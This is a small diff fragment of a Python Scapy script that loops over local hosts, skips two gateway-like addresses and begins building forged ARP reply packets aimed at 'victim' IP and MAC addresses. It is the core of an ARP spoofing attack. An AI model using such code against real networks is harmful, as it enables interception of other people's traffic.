@@ -183,8 +183,8 @@ if __name__ == "__main__":
             # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
 
             for j in range(0,len(ip)):
-                if(ip[j]!="10.0.0.2" and ip[j]!="10.0.0.3"):
-                    print("Send from: ",ip[j]," ",mac[j]),
+                if(ip[j]!="10.0.2.2" and ip[j]!="10.0.2.3"):
+                    print("Send to: ",ip[j]," ",mac[j]),
                     victimpacket = ARP(op=2,
                                     pdst = ip[j],               # victim's IP
                                     hwdst= mac[j],              # victim's MAC 
